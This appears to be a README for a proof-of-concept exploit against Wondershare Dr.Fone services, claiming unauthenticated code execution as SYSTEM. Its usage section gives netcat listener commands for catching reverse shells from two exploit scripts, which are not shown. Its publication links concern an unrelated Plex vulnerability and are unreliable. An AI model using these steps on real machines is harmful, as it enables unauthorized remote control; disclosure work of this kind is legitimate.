# WonderShell -  CVE

POC example to exploit [Wondershare Dr.Fone][https://drfone.wondershare.com/] .

## Discovered by
Netanel Cohen, and Tomer Peled a Security Researchers from BugSec.

## Details
Dr.Fone is a phone tool-kit develop by wondershare , pron to RCE .
As unauthenticated user we manage to execute remote code as SYSTEM user.

Two services are vulerable:
  InstallAssistService.exe
  ElevationService.exe

Tested on Dr.Fone 
## Usage
Change ip and port and execute.
```
stty raw -echo; (stty size; cat) | nc -lvnp 1338
./ElevationServiceRCE.py
```

```
nc -lvnp 1337
./InstallAssistRCE.py
```


## Publications
https://ir-on.io/2021/12/02/local-privilege-plexcalation/

https://forums.plex.tv/t/security-regarding-cve-2021-42835/761510


